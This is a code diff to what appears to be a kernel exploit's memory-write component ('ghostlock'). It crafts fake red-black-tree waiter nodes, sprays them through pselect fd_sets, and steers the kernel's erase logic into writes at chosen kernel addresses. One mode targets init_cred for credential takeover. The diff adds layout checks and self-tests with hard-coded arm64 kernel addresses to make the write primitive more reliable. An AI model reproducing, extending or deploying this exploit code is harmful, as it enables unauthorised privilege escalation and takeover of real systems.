@@ -36,14 +36,20 @@ namespace ghostlock::memory {
                                const WriteRequest &request,
                                const PayloadWriteLayout &layout) noexcept {
         if (waiter.size() < kCompactWaiterBytes) return false;
-        if (layout.right) {
-            return span_store64(waiter, 0x18, layout.right) &&
-                   span_store64(waiter, 0x20, 0) &&
-                   span_store64(waiter, 0x28, request.target);
-        }
-        return span_store64(waiter, 0x18, layout.parent) &&
-               span_store64(waiter, 0x20, layout.right) &&
-               span_store64(waiter, 0x28, layout.left);
+        /* One triple, one definition (see waiter_tree_stamp): the route stamps the
+         * same words into the pselect fd_sets, so a divergence here would be a
+         * different vehicle than the one that was probed. */
+        const WaiterTreeStamp stamp = waiter_tree_stamp(layout);
+        /* The stamp must place the write where the request asked for it: the
+         * pointer layouts store at rb_left (= target), the leaf layout has no
+         * children and steers the erase's collateral from target - 8. Anything
+         * else is a write to the wrong address, not a malformed payload. */
+        if (!((stamp.left == request.target && stamp.left != 0) ||
+              (stamp.left == 0 && stamp.pc == request.target - 8)))
+            return false;
+        return span_store64(waiter, 0x18, stamp.pc) &&
+               span_store64(waiter, 0x20, stamp.right) &&
+               span_store64(waiter, 0x28, stamp.left);
     }
 
     bool encode_multicast_waiter(std::span<std::byte> buffer,
@@ -66,7 +72,13 @@ namespace ghostlock::memory {
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
                                : page_base + 0x100;
+            /* the erase stores at rb_left, and the collateral re-parents through
+             * this same value -- see waiter_tree_stamp */
+            layout.left = request->target;
         }
+        /* The leaf layout carries no value on the node: right and left stay 0 and
+         * the erase's collateral, steered by layout.parent (= target - 8), does
+         * the zero write. See waiter_tree_stamp. */
         if (request->mode == WriteMode::Credential) {
             layout.fops = credential_fops;
             layout.needs_credential_copy = true;
@@ -90,7 +102,13 @@ namespace ghostlock::memory {
     int32_t payload_write_layout_matches_request(
         const WriteRequest *request, const PayloadWriteLayout *layout) {
         if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
-        return request->preserve_child ? layout->right != 0 : layout->right == 0;
+        if (request->preserve_child) return layout->right != 0;
+        /* Leaf layout: childless, steered by a real parent pointer, so neither the
+         * lock's tree root nor the enqueue's descent can be reached with a value
+         * the kernel would treat as a node. */
+        return layout->right == 0 && layout->left == 0 &&
+               layout->parent == request->target - 8 &&
+               layout->parent != 0;
     }
 
     int32_t payload_write_layout_accepts_page(
@@ -123,6 +141,9 @@ namespace ghostlock::memory {
             uintptr_t expected_pc;
             uintptr_t expected_left;
         } vectors[] = {
+            /* leaf/zero layout: CHILDLESS, pc = target - 8 -- no value is stored
+             * on the node at all; the erase's collateral writes NULL at
+             * parent + 8 = *(target). See waiter_tree_stamp. */
             {
                 0xffffff8000123000ULL, WriteMode::Zero, 1,
                 0xffffff8000122ff8ULL, 0
@@ -152,6 +173,21 @@ namespace ghostlock::memory {
                 !payload_write_layout_accepts_page(&request, &layout))
                 return 0;
         }
+        /* The invariant the vehicle rests on: a zero write's node is CHILDLESS and
+         * its pc is a real parent pointer, so the erase cannot reach the lock's
+         * tree root and the enqueue's descent exits on its first test. A
+         * regression here is a kernel data abort in the walk, not a wrong write. */
+        const WriteRequest zero = WriteRequest::make(
+            0xffffff8000126000ULL, WriteMode::Zero, 1);
+        const PayloadWriteLayout zero_layout = payload_write_layout(
+            &zero, page, 0x1111, 0x2222, init_cred);
+        const WaiterTreeStamp zero_stamp = waiter_tree_stamp(zero_layout);
+        if (zero_stamp.pc != zero.target - 8 || zero_stamp.pc == 0 ||
+            zero_stamp.right != 0 || zero_stamp.left != 0 ||
+            zero_layout.right != 0 || zero_layout.left != 0 ||
+            !payload_write_layout_matches_request(&zero, &zero_layout))
+            return 0;
+
         const WriteRequest w1 = WriteRequest::make(
             0xffffff8000124000ULL, WriteMode::Zero, false);
         PayloadWriteLayout rejected = payload_write_layout(
